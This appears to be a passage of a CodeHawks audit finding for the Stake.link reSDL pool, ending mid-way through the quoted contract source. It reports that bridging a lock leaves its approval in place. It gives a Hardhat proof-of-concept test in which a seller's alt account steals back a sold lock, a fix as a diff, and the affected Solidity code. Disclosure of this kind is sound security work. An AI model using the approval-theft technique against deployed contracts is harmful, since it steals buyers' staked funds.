{
  "Title": "A user can steal an already transfered and bridged reSDL lock because of approval",
  "Content": "# A user can steal an already transfered and bridged reSDL lock because of approval\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172-L199\">https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172-L199</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259-L281\">https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259-L281</a>\n\n\n## Summary\nThe reSDL token approval is not deleted when the lock is bridged to an other chain\n\n## Vulnerability Details\nWhen a reSDL token is bridged to an other chain, the `handleOutgoingRESDL()` function is called to make the state changes into the `sdlPool` contract. The function executes the following:\n\n```\n    function handleOutgoingRESDL(\n        address _sender,\n        uint256 _lockId,\n        address _sdlReceiver\n    )\n        external\n        onlyCCIPController\n        onlyLockOwner(_lockId, _sender)\n        updateRewards(_sender)\n        updateRewards(ccipController)\n        returns (Lock memory)\n    {\n        Lock memory lock = locks[_lockId];\n\n        delete locks[_lockId].amount;\n        delete lockOwners[_lockId];\n        balances[_sender] -= 1;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_sender] -= totalAmount;\n        effectiveBalances[ccipController] += totalAmount;\n\n        sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n        emit OutgoingRESDL(_sender, _lockId);\n\n        return lock;\n    }\n```\nAs we can see, it deletes the lock.amount of the lockId, removes the ownership of the lock and decrements the lock balance of the account that is bridging the lock.\nThe approval that the user had before bridging the reSDL lock will remain there and he can get benefited from it by stealing the NFT.\nConsider the following situation:\nA user knows that there is a victim that is willing to pay the underlying value for a reSDL lock ownership transfer. What the malicious user can do is set approval to move his lockId in all supported chains to an alt address that he owns. Then, he trades the underlying value for the reSDL ownership and the lock is transfered to the victim/buyer. If the buyer keeps the lock in this chain nothing happens, but if he bridges any of the other supported chains, the malicious user can use the approval of his alt account to steal the reSDL lock.\n\n#### Proof of Concept\nIt is written inside `resdl-token-bridge.test.ts` because it uses its setup\n```\n  it('PoC steal reSDL', async () => {\n    let lockId = 2\n\n    let thief = accounts[0]\n    let victim = accounts[1]\n\n    let thiefAccount2 = accounts[2]\n\n    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp\n\n    // Thief approves an alt account that he controls to move his lock in the original chain\n    await sdlPool.approve(thiefAccount2, lockId)\n\n    assert.equal(await sdlPool.getApproved(2), thiefAccount2);\n\n    // Thief bridges the lock to an other chain but the approval is not deleted\n    await bridge.transferRESDL(77, victim, lockId, true, toEther(10), { value: toEther(10) })\n    let lastRequestMsg = await onRamp.getLastRequestMessage()\n    assert.deepEqual(\n      ethers.utils.defaultAbiCoder\n        .decode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],\n          lastRequestMsg[1]\n        )\n        .map((d, i) => {\n          if (i == 0) return d\n          if (i > 1 && i < 4) return fromEther(d)\n          return d.toNumber()\n        }),\n      [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]\n    )\n    assert.deepEqual(\n      lastRequestMsg[2].map((d) => [d.token, fromEther(d.amount)]),\n      [[sdlToken.address, 1000]]\n    )\n    assert.equal(lastRequestMsg[3], wrappedNative.address)\n    assert.equal(lastRequestMsg[4], '0x11')\n    await expect(sdlPool.ownerOf(lockId)).to.be.revertedWith('InvalidLockId()')\n\n    // The user that received the lock from bridging on the other chain decides to bridge the lock id\n    // back to the original chain\n    await offRamp\n      .connect(signers[6])\n      .executeSingleMessage(\n        ethers.utils.formatBytes32String('messageId'),\n        77,\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],\n          [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]\n        ),\n        sdlPoolCCIPController.address,\n        [{ token: sdlToken.address, amount: toEther(25) }]\n      )\n\n\n    // Now the victim owns the reSDL lock on the original chain\n    assert.equal(await sdlPool.ownerOf(2), victim)\n\n    // However, this lockId has the approval that originally the thief set to his alt account and victim do not know that\n    assert.equal(await sdlPool.getApproved(2), thiefAccount2);\n\n    // Thief transfers back to his main account the reSDL via his alt account\n    await sdlPool\n      .connect(signers[2])\n      .transferFrom(victim, thief, lockId)\n\n    // Thief is now the owner of the reSDL\n    assert.equal(await sdlPool.ownerOf(2), thief)\n  })\n```\n\n## Impact\nHigh, possibility to steal funds\n\n## Tools Used\nManual review\n\n## Recommendations\nWhen bridging a lock between chains, the lock approval should be deleted.\n\n```diff\n     function handleOutgoingRESDL(\n         address _sender,\n         uint256 _lockId,\n         address _sdlReceiver\n     )\n         external\n         onlyCCIPController\n         onlyLockOwner(_lockId, _sender)\n         updateRewards(_sender)\n         updateRewards(ccipController)\n         returns (Lock memory)\n     {\n         Lock memory lock = locks[_lockId];\n \n         delete locks[_lockId].amount;\n         delete lockOwners[_lockId];\n         balances[_sender] -= 1;\n+        delete tokenApprovals[_lockId];\n\n         uint256 totalAmount = lock.amount + lock.boostAmount;\n         effectiveBalances[_sender] -= totalAmount;\n         effectiveBalances[ccipController] += totalAmount;\n\n         sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n         emit OutgoingRESDL(_sender, _lockId);\n\n         return lock;\n     }\n```",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674",
  "Code": [
    {
      "filename": "contracts/core/sdlPool/SDLPoolPrimary.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.15;\n\nimport \"./base/SDLPool.sol\";\n\n/**\n * @title SDL Pool Primary\n * @notice Allows users to stake/lock SDL tokens and receive a percentage of the protocol's earned rewards\n * @dev deployed only on the primary chain\n */\ncontract SDLPoolPrimary is SDLPool {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    address public delegatorPool;\n\n    event IncomingUpdate(uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange, uint256 mintStartIndex);\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /**\n     * @notice initializes contract\n     * @param _name name of the staking derivative token\n     * @param _symbol symbol of the staking derivative token\n     * @param _sdlToken address of the SDL token\n     * @param _boostController address of the boost controller\n     **/\n    function initialize(\n        string memory _name,\n        string memory _symbol,\n        address _sdlToken,\n        address _boostController\n    ) public reinitializer(2) {\n        if (delegatorPool == address(0)) {\n            __SDLPoolBase_init(_name, _symbol, _sdlToken, _boostController);\n        } else {\n            delegatorPool = ccipController;\n        }\n    }\n\n    /**\n     * @notice ERC677 implementation to stake/lock SDL tokens or distribute rewards\n     * @dev\n     * - will update/create a lock if the token transferred is SDL or will distribute rewards otherwise\n     *\n     * For Non-SDL:\n     * - reverts if token is unsupported\n     *\n     * For SDL:\n     * - set lockId to 0 to create a new lock or set lockId to > 0 to stake more into an existing lock\n     * - set lockingDuration to 0 to stake without locking or set lockingDuration to > 0 to lock for an amount\n     *   time in seconds\n     * - see _updateLock() for more details on updating an existing lock or _createLock() for more details on\n     *   creating a new lock\n     * @param _sender of the stake\n     * @param _value of the token transfer\n     * @param _calldata encoded lockId (uint256) and lockingDuration (uint64)\n     **/\n    function onTokenTransfer(\n        address _sender,\n        uint256 _value,\n        bytes calldata _calldata\n    ) external override {\n        if (msg.sender != address(sdlToken) && !isTokenSupported(msg.sender)) revert UnauthorizedToken();\n\n        if (_value == 0) revert InvalidValue();\n\n        if (msg.sender == address(sdlToken)) {\n            (uint256 lockId, uint64 lockingDuration) = abi.decode(_calldata, (uint256, uint64));\n            if (lockId != 0) {\n                _storeUpdatedLock(_sender, lockId, _value, lockingDuration);\n            } else {\n                _storeNewLock(_sender, _value, lockingDuration);\n            }\n        } else {\n            distributeToken(msg.sender);\n        }\n    }\n\n    /**\n     * @notice extends the locking duration of a lock\n     * @dev\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if `_lockingDuration` is less than current locking duration of lock\n     * - reverts if `_lockingDuration` is 0 or exceeds the maximum\n     * @param _lockId id of lock\n     * @param _lockingDuration new locking duration to set\n     **/\n    function extendLockDuration(uint256 _lockId, uint64 _lockingDuration) external {\n        if (_lockingDuration == 0) revert InvalidLockingDuration();\n        _storeUpdatedLock(msg.sender, _lockId, 0, _lockingDuration);\n    }\n\n    /**\n     * @notice initiates the unlock period for a lock\n     * @dev\n     * - at least half of the locking duration must have elapsed to initiate the unlock period\n     * - the unlock period consists of half of the locking duration\n     * - boost will be set to 0 upon initiation of the unlock period\n     *\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if a minimum of half the locking duration has not elapsed\n     * @param _lockId id of lock\n     **/\n    function initiateUnlock(uint256 _lockId) external onlyLockOwner(_lockId, msg.sender) updateRewards(msg.sender) {\n        if (locks[_lockId].expiry != 0) revert UnlockAlreadyInitiated();\n        uint64 halfDuration = locks[_lockId].duration / 2;\n        if (locks[_lockId].startTime + halfDuration > block.timestamp) revert HalfDurationNotElapsed();\n\n        uint64 expiry = uint64(block.timestamp) + halfDuration;\n        locks[_lockId].expiry = expiry;\n\n        uint256 boostAmount = locks[_lockId].boostAmount;\n        locks[_lockId].boostAmount = 0;\n        effectiveBalances[msg.sender] -= boostAmount;\n        totalEffectiveBalance -= boostAmount;\n\n        emit InitiateUnlock(msg.sender, _lockId, expiry);\n    }\n\n    /**\n     * @notice withdraws unlocked SDL\n     * @dev\n     * - SDL can only be withdrawn if unlocked (once the unlock period has elapsed or if it was never\n     *   locked in the first place)\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if not unlocked\n     * - reverts if `_amount` exceeds the amount staked in the lock\n     * @param _lockId id of the lock\n     * @param _amount amount to withdraw from the lock\n     **/\n    function withdraw(uint256 _lockId, uint256 _amount)\n        external\n        onlyLockOwner(_lockId, msg.sender)\n        updateRewards(msg.sender)\n    {\n        if (locks[_lockId].startTime != 0) {\n            uint64 expiry = locks[_lockId].expiry;\n            if (expiry == 0) revert UnlockNotInitiated();\n            if (expiry > block.timestamp) revert TotalDurationNotElapsed();\n        }\n\n        uint256 baseAmount = locks[_lockId].amount;\n        if (_amount > baseAmount) revert InsufficientBalance();\n\n        emit Withdraw(msg.sender, _lockId, _amount);\n\n        if (_amount == baseAmount) {\n            delete locks[_lockId];\n            delete lockOwners[_lockId];\n            balances[msg.sender] -= 1;\n            if (tokenApprovals[_lockId] != address(0)) delete tokenApprovals[_lockId];\n            emit Transfer(msg.sender, address(0), _lockId);\n        } else {\n            locks[_lockId].amount = baseAmount - _amount;\n        }\n\n        effectiveBalances[msg.sender] -= _amount;\n        totalEffectiveBalance -= _amount;\n\n        sdlToken.safeTransfer(msg.sender, _amount);\n    }\n\n    /**\n     * @notice handles an outgoing transfer of an reSDL lock to another chain\n     * @param _sender sender of lock\n     * @param _lockId id of lock\n     * @param _sdlReceiver address to receive underlying SDL on this chain\n     */\n    function handleOutgoingRESDL(\n        address _sender,\n        uint256 _lockId,\n        address _sdlReceiver\n    )\n        external\n        onlyCCIPController\n        onlyLockOwner(_lockId, _sender)\n        updateRewards(_sender)\n        updateRewards(ccipController)\n        returns (Lock memory)\n    {\n        Lock memory lock = locks[_lockId];\n\n        delete locks[_lockId].amount;\n        delete lockOwners[_lockId];\n        balances[_sender] -= 1;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_sender] -= totalAmount;\n        effectiveBalances[ccipController] += totalAmount;\n\n        sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n        emit OutgoingRESDL(_sender, _lockId);\n\n        return lock;\n    }\n\n    /**\n     * @notice handles an incoming transfer of an reSDL lock from another chain\n     * @param _receiver receiver of lock\n     * @param _lockId id of lock\n     * @param _lock lock\n     */\n    function handleIncomingRESDL(\n        address _receiver,\n        uint256 _lockId,\n        Lock calldata _lock\n    ) external onlyCCIPController updateRewards(_receiver) updateRewards(ccipController) {\n        if (lockOwners[_lockId] != address(0)) revert InvalidLockId();\n\n        locks[_lockId] = Lock(_lock.amount, _lock.boostAmount, _lock.startTime, _lock.duration, _lock.expiry);\n        lockOwners[_lockId] = _receiver;\n        balances[_receiver] += 1;\n\n        uint256 totalAmount = _lock.amount + _lock.boostAmount;\n        effectiveBalances[_receiver] += totalAmount;\n        effectiveBalances[ccipController] -= totalAmount;\n\n        emit IncomingRESDL(_receiver, _lockId);\n    }\n\n    /**\n     * @notice handles an incoming update from a secondary chain\n     * @dev updates the total reSDL supply and keeps reSDL lock ids consistent between chains\n     * @param _numNewRESDLTokens number of new reSDL locks to be minted on other chain\n     * @param _totalRESDLSupplyChange total reSDL supply change on other chain\n     */\n    function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)\n        external\n        onlyCCIPController\n        returns (uint256)\n    {\n        uint256 mintStartIndex;\n        if (_numNewRESDLTokens != 0) {\n            mintStartIndex = lastLockId + 1;\n            lastLockId += _numNewRESDLTokens;\n        }\n\n        if (_totalRESDLSupplyChange > 0) {\n            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);\n            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);\n        } else if (_totalRESDLSupplyChange < 0) {\n            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);\n            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);\n        }\n\n        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);\n\n        return mintStartIndex;\n    }\n\n    /**\n     * @notice used by the delegator pool to migrate user stakes to this contract\n     * @dev\n     * - creates a new lock to represent the migrated stake\n     * - reverts if `_lockingDuration` exceeds maximum\n     * @param _sender owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function migrate(\n        address _sender,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) external {\n        if (msg.sender != delegatorPool) revert SenderNotAuthorized();\n        sdlToken.safeTransferFrom(delegatorPool, address(this), _amount);\n        _storeNewLock(_sender, _amount, _lockingDuration);\n    }\n\n    /**\n     * @notice stores a new lock\n     * @param _owner owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function _storeNewLock(\n        address _owner,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal updateRewards(_owner) {\n        Lock memory lock = _createLock(_amount, _lockingDuration);\n        uint256 lockId = lastLockId + 1;\n\n        locks[lockId] = lock;\n        lockOwners[lockId] = _owner;\n        balances[_owner] += 1;\n        lastLockId++;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_owner] += totalAmount;\n        totalEffectiveBalance += totalAmount;\n\n        emit CreateLock(_owner, lockId, lock.amount, lock.boostAmount, lock.duration);\n        emit Transfer(address(0), _owner, lockId);\n    }\n\n    /**\n     * @notice stores an updated lock\n     * @param _owner owner of lock\n     * @param _amount amount to stake\n     * @param _lockingDuration duration of lock\n     */\n    function _storeUpdatedLock(\n        address _owner,\n        uint256 _lockId,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal onlyLockOwner(_lockId, _owner) updateRewards(_owner) {\n        Lock memory lock = _updateLock(locks[_lockId], _amount, _lockingDuration);\n\n        int256 diffTotalAmount = int256(lock.amount + lock.boostAmount) -\n            int256(locks[_lockId].amount + locks[_lockId].boostAmount);\n\n        if (diffTotalAmount > 0) {\n            effectiveBalances[_owner] += uint256(diffTotalAmount);\n            totalEffectiveBalance += uint256(diffTotalAmount);\n        } else if (diffTotalAmount < 0) {\n            effectiveBalances[_owner] -= uint256(-1 * diffTotalAmount);\n            totalEffectiveBalance -= uint256(-1 * diffTotalAmount);\n        }\n\n        locks[_lockId] = lock;\n\n        emit UpdateLock(_owner, _lockId, lock.amount, lock.boostAmount, lock.duration);\n    }\n}"
    },
    {
      "filename": "contracts/core/sdlPool/SDLPoolSecondary.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.15;\n\nimport \"./base/SDLPool.sol\";\n\n/**\n * @title SDL Pool Secondary\n * @notice Allows users to stake/lock SDL tokens and receive a percentage of the protocol's earned rewards\n * @dev deployed on all supported chains besides the primary chain\n */\ncontract SDLPoolSecondary is SDLPool {\n    using SafeERC20Upgradeable for IERC20Upgradeable;\n\n    struct NewLockPointer {\n        uint128 updateBatchIndex;\n        uint128 index;\n    }\n    struct LockUpdate {\n        uint128 updateBatchIndex;\n        Lock lock;\n    }\n\n    mapping(uint256 => LockUpdate[]) internal queuedLockUpdates;\n\n    uint256 public queuedNewLockLimit;\n    uint256[] internal currentMintLockIdByBatch;\n    Lock[][] internal queuedNewLocks;\n    mapping(address => NewLockPointer[]) internal newLocksByOwner;\n\n    uint128 public updateBatchIndex;\n    uint64 public updateInProgress;\n    uint64 internal updateNeeded;\n    int256 public queuedRESDLSupplyChange;\n\n    event QueueInitiateUnlock(address indexed owner, uint256 indexed lockId, uint64 expiry);\n    event QueueWithdraw(address indexed owner, uint256 indexed lockId, uint256 amount);\n    event QueueCreateLock(address indexed owner, uint256 amount, uint256 boostAmount, uint64 lockingDuration);\n    event QueueUpdateLock(\n        address indexed owner,\n        uint256 indexed lockId,\n        uint256 amount,\n        uint256 boostAmount,\n        uint64 lockingDuration\n    );\n    event OutgoingUpdate(uint128 indexed batchIndex, uint256 numNewQueuedLocks, int256 reSDLSupplyChange);\n    event IncomingUpdate(uint128 indexed batchIndex, uint256 mintStartIndex);\n\n    error CannotTransferWithQueuedUpdates();\n    error UpdateInProgress();\n    error NoUpdateInProgress();\n    error TooManyQueuedLocks();\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /**\n     * @notice initializes contract\n     * @param _name name of the staking derivative token\n     * @param _symbol symbol of the staking derivative token\n     * @param _sdlToken address of the SDL token\n     * @param _boostController address of the boost controller\n     * @param _queuedNewLockLimit max amount of queued new locks an account can have\n     **/\n    function initialize(\n        string memory _name,\n        string memory _symbol,\n        address _sdlToken,\n        address _boostController,\n        uint256 _queuedNewLockLimit\n    ) public initializer {\n        __SDLPoolBase_init(_name, _symbol, _sdlToken, _boostController);\n        updateBatchIndex = 1;\n        currentMintLockIdByBatch.push(0);\n        queuedNewLocks.push();\n        queuedNewLocks.push();\n        queuedNewLockLimit = _queuedNewLockLimit;\n    }\n\n    /**\n     * @notice returns a list of queued new locks for an owner\n     * @param _owner owner of locks\n     * @return list of queued locks and corresponding batch indexes\n     **/\n    function getQueuedNewLocksByOwner(address _owner) external view returns (Lock[] memory, uint256[] memory) {\n        uint256 numNewLocks = newLocksByOwner[_owner].length;\n        Lock[] memory newLocks = new Lock[](numNewLocks);\n        uint256[] memory batchIndexes = new uint256[](numNewLocks);\n\n        for (uint256 i = 0; i < numNewLocks; ++i) {\n            NewLockPointer memory pointer = newLocksByOwner[_owner][i];\n            newLocks[i] = queuedNewLocks[pointer.updateBatchIndex][pointer.index];\n            batchIndexes[i] = pointer.updateBatchIndex;\n        }\n\n        return (newLocks, batchIndexes);\n    }\n\n    /**\n     * @notice returns queued lock updates for a list of lock ids\n     * @param _lockIds list of lock ids\n     * @return list of queued lock updates corresponding to each lock id\n     **/\n    function getQueuedLockUpdates(uint256[] calldata _lockIds) external view returns (LockUpdate[][] memory) {\n        LockUpdate[][] memory updates = new LockUpdate[][](_lockIds.length);\n\n        for (uint256 i = 0; i < _lockIds.length; ++i) {\n            updates[i] = queuedLockUpdates[_lockIds[i]];\n        }\n\n        return updates;\n    }\n\n    /**\n     * @notice ERC677 implementation to stake/lock SDL tokens or distribute rewards\n     * @dev operations will be queued until the next update at which point the user can execute (excludes reward distribution)\n     * @dev\n     * - will update/create a lock if the token transferred is SDL or will distribute rewards otherwise\n     *\n     * For Non-SDL:\n     * - reverts if token is unsupported\n     *\n     * For SDL:\n     * - set lockId to 0 to create a new lock or set lockId to > 0 to stake more into an existing lock\n     * - set lockingDuration to 0 to stake without locking or set lockingDuration to > 0 to lock for an amount\n     *   time in seconds\n     * @param _sender of the stake\n     * @param _value of the token transfer\n     * @param _calldata encoded lockId (uint256) and lockingDuration (uint64)\n     **/\n    function onTokenTransfer(\n        address _sender,\n        uint256 _value,\n        bytes calldata _calldata\n    ) external override {\n        if (msg.sender != address(sdlToken) && !isTokenSupported(msg.sender)) revert UnauthorizedToken();\n\n        if (_value == 0) revert InvalidValue();\n\n        if (msg.sender == address(sdlToken)) {\n            (uint256 lockId, uint64 lockingDuration) = abi.decode(_calldata, (uint256, uint64));\n            if (lockId != 0) {\n                _queueLockUpdate(_sender, lockId, _value, lockingDuration);\n            } else {\n                _queueNewLock(_sender, _value, lockingDuration);\n            }\n        } else {\n            distributeToken(msg.sender);\n        }\n    }\n\n    /**\n     * @notice extends the locking duration of a lock\n     * @dev operation will be queued until the next update at which point the user can execute\n     * @dev\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if `_lockingDuration` is less than current locking duration of lock\n     * - reverts if `_lockingDuration` is 0 or exceeds the maximum\n     * @param _lockId id of lock\n     * @param _lockingDuration new locking duration to set\n     **/\n    function extendLockDuration(uint256 _lockId, uint64 _lockingDuration) external {\n        if (_lockingDuration == 0) revert InvalidLockingDuration();\n        _queueLockUpdate(msg.sender, _lockId, 0, _lockingDuration);\n    }\n\n    /**\n     * @notice initiates the unlock period for a lock\n     * @dev operation will be queued until the next update at which point the user can execute\n     * @dev\n     * - at least half of the locking duration must have elapsed to initiate the unlock period\n     * - the unlock period consists of half of the locking duration\n     * - boost will be set to 0 upon initiation of the unlock period\n     *\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if a minimum of half the locking duration has not elapsed\n     * @param _lockId id of lock\n     **/\n    function initiateUnlock(uint256 _lockId) external onlyLockOwner(_lockId, msg.sender) updateRewards(msg.sender) {\n        Lock memory lock = _getQueuedLockState(_lockId);\n\n        if (lock.expiry != 0) revert UnlockAlreadyInitiated();\n        uint64 halfDuration = lock.duration / 2;\n        if (lock.startTime + halfDuration > block.timestamp) revert HalfDurationNotElapsed();\n\n        uint64 expiry = uint64(block.timestamp) + halfDuration;\n        lock.expiry = expiry;\n\n        uint256 boostAmount = lock.boostAmount;\n        lock.boostAmount = 0;\n        effectiveBalances[msg.sender] -= boostAmount;\n        totalEffectiveBalance -= boostAmount;\n\n        queuedLockUpdates[_lockId].push(LockUpdate(updateBatchIndex, lock));\n        queuedRESDLSupplyChange -= int256(boostAmount);\n        if (updateNeeded == 0) updateNeeded = 1;\n\n        emit QueueInitiateUnlock(msg.sender, _lockId, expiry);\n    }\n\n    /**\n     * @notice withdraws unlocked SDL\n     * @dev operation will be queued until the next update at which point the user can execute\n     * @dev\n     * - SDL can only be withdrawn if unlocked (once the unlock period has elapsed or if it was never\n     *   locked in the first place)\n     * - reverts if `_lockId` is invalid or sender is not owner of lock\n     * - reverts if not unlocked\n     * - reverts if `_amount` exceeds the amount staked in the lock\n     * @param _lockId id of the lock\n     * @param _amount amount to withdraw from the lock\n     **/\n    function withdraw(uint256 _lockId, uint256 _amount)\n        external\n        onlyLockOwner(_lockId, msg.sender)\n        updateRewards(msg.sender)\n    {\n        Lock memory lock = _getQueuedLockState(_lockId);\n\n        if (lock.startTime != 0) {\n            uint64 expiry = lock.expiry;\n            if (expiry == 0) revert UnlockNotInitiated();\n            if (expiry > block.timestamp) revert TotalDurationNotElapsed();\n        }\n\n        uint256 baseAmount = lock.amount;\n        if (_amount > baseAmount) revert InsufficientBalance();\n\n        lock.amount = baseAmount - _amount;\n        effectiveBalances[msg.sender] -= _amount;\n        totalEffectiveBalance -= _amount;\n\n        queuedLockUpdates[_lockId].push(LockUpdate(updateBatchIndex, lock));\n        queuedRESDLSupplyChange -= int256(_amount);\n        if (updateNeeded == 0) updateNeeded = 1;\n\n        emit QueueWithdraw(msg.sender, _lockId, _amount);\n    }\n\n    /**\n     * @notice executes queued operations for the sender\n     * @dev will mint new locks and update existing locks\n     * @dev an operation can only be executed once its encompassing batch is finalized\n     * @param _lockIds ids of locks to update\n     **/\n    function executeQueuedOperations(uint256[] memory _lockIds) external {\n        _executeQueuedLockUpdates(msg.sender, _lockIds);\n        _mintQueuedNewLocks(msg.sender);\n    }\n\n    /**\n     * @notice handles the outgoing transfer of an reSDL lock to another chain\n     * @param _sender sender of the transfer\n     * @param _lockId id of lock\n     * @param _sdlReceiver address to receive underlying SDL on this chain\n     * @return lock the lock being transferred\n     **/\n    function handleOutgoingRESDL(\n        address _sender,\n        uint256 _lockId,\n        address _sdlReceiver\n    ) external onlyCCIPController onlyLockOwner(_lockId, _sender) updateRewards(_sender) returns (Lock memory) {\n        if (queuedLockUpdates[_lockId].length != 0) revert CannotTransferWithQueuedUpdates();\n\n        Lock memory lock = locks[_lockId];\n\n        delete locks[_lockId].amount;\n        delete lockOwners[_lockId];\n        balances[_sender] -= 1;\n\n        uint256 totalAmount = lock.amount + lock.boostAmount;\n        effectiveBalances[_sender] -= totalAmount;\n        totalEffectiveBalance -= totalAmount;\n\n        sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n        emit OutgoingRESDL(_sender, _lockId);\n\n        return lock;\n    }\n\n    /**\n     * @notice handles the incoming transfer of an reSDL lock from another chain\n     * @param _receiver receiver of the transfer\n     * @param _lockId id of lock\n     * @param _lock lock\n     **/\n    function handleIncomingRESDL(\n        address _receiver,\n        uint256 _lockId,\n        Lock calldata _lock\n    ) external onlyCCIPController updateRewards(_receiver) {\n        if (lockOwners[_lockId] != address(0)) revert InvalidLockId();\n\n        locks[_lockId] = Lock(_lock.amount, _lock.boostAmount, _lock.startTime, _lock.duration, _lock.expiry);\n        lockOwners[_lockId] = _receiver;\n        balances[_receiver] += 1;\n\n        uint256 totalAmount = _lock.amount + _lock.boostAmount;\n        effectiveBalances[_receiver] += totalAmount;\n        totalEffectiveBalance += totalAmount;\n\n        if (_lockId > lastLockId) lastLockId = _lockId;\n\n        emit IncomingRESDL(_receiver, _lockId);\n    }\n\n    /**\n     * @notice handles an outgoing update to the primary chain\n     * @return the number of new locks to mint and the reSDL supply change since the last update\n     **/\n    function handleOutgoingUpdate() external onlyCCIPController returns (uint256, int256) {\n        if (updateInProgress == 1) revert UpdateInProgress();\n\n        uint256 numNewQueuedLocks = queuedNewLocks[updateBatchIndex].length;\n        int256 reSDLSupplyChange = queuedRESDLSupplyChange;\n\n        queuedRESDLSupplyChange = 0;\n        updateBatchIndex++;\n        updateInProgress = 1;\n        updateNeeded = 0;\n        queuedNewLocks.push();\n\n        emit OutgoingUpdate(updateBatchIndex - 1, numNewQueuedLocks, reSDLSupplyChange);\n\n        return (numNewQueuedLocks, reSDLSupplyChange);\n    }\n\n    /**\n     * @notice handles an incoming update from the primary chain\n     * @dev an outgoing update must be sent prior to receiving an incoming update\n     * @dev finalizes the most recent batch of operations\n     * @param _mintStartIndex start index to use for minting new locks in the lastest batch\n     **/\n    function handleIncomingUpdate(uint256 _mintStartIndex) external onlyCCIPController {\n        if (updateInProgress == 0) revert NoUpdateInProgress();\n\n        if (_mintStartIndex != 0) {\n            uint256 newLastLockId = _mintStartIndex + queuedNewLocks[updateBatchIndex - 1].length - 1;\n            if (newLastLockId > lastLockId) lastLockId = newLastLockId;\n        }\n\n        currentMintLockIdByBatch.push(_mintStartIndex);\n        updateInProgress = 0;\n        emit IncomingUpdate(updateBatchIndex - 1, _mintStartIndex);\n    }\n\n    /**\n     * @notice returns whether an update should be sent to the primary chain\n     * @return whether update should be sent\n     **/\n    function shouldUpdate() external view returns (bool) {\n        return updateNeeded == 1 && updateInProgress == 0;\n    }\n\n    /**\n     * @notice queues a new lock to be minted\n     * @param _owner owner of lock\n     * @param _amount amount of underlying SDL\n     * @param _lockingDuration locking duration\n     **/\n    function _queueNewLock(\n        address _owner,\n        uint256 _amount,\n        uint64 _lockingDuration\n    ) internal {\n        if (newLocksByOwner[_owner].length >= queuedNewLockLimit) revert TooManyQueuedLocks();\n\n        Lock memory lock = _createLock(_amount, _lockingDuration);\n        queuedNewLocks[updateBatchIndex].push(lock);\n        newLocksByOwner[_owner].push(NewLockPointer(updateBatchIndex, uint128(queuedNewLocks[updateBatchIndex].length - 1)));\n        queuedRESDLSupplyChange += int256(lock.amount + lock.boostAmount);\n        if (updateNeeded == 0) updateNeeded = 1;\n\n        emit QueueCreateLock(_owner, _amount, lock.boostAmount, _lockingDuration);\n    }\n\n    /**\n     * @notice mints queued new locks for an owner\n     * @dev will only mint locks that are part of finalized batches\n     * @param _owner owner address\n     **/\n    function _mintQueuedNewLocks(address _owner) internal updateRewards(_owner) {\n        uint256 finalizedBatchIndex = _getFinalizedUpdateBatchIndex();\n        uint256 numNewLocks = newLocksByOwner[_owner].length;\n        uint256 i = 0;\n        while (i < numNewLocks) {\n            NewLockPointer memory newLockPointer = newLocksByOwner[_owner][i];\n            if (newLockPointer.updateBatchIndex > finalizedBatchIndex) break;\n\n            uint256 lockId = currentMintLockIdByBatch[newLockPointer.updateBatchIndex];\n            Lock memory lock = queuedNewLocks[newLockPointer.updateBatchIndex][newLockPointer.index];\n\n            currentMintLockIdByBatch[newLockPointer.updateBatchIndex] += 1;\n\n            locks[lockId] = lock;\n            lockOwners[lockId] = _owner;\n            balances[_owner] += 1;\n\n            uint256 totalAmount = lock.amount + lock.boostAmount;\n            effectiveBalances[_owner] += totalAmount;\n            totalEffectiveBalance += totalAmount;\n\n            emit CreateLock(_owner, lockId, 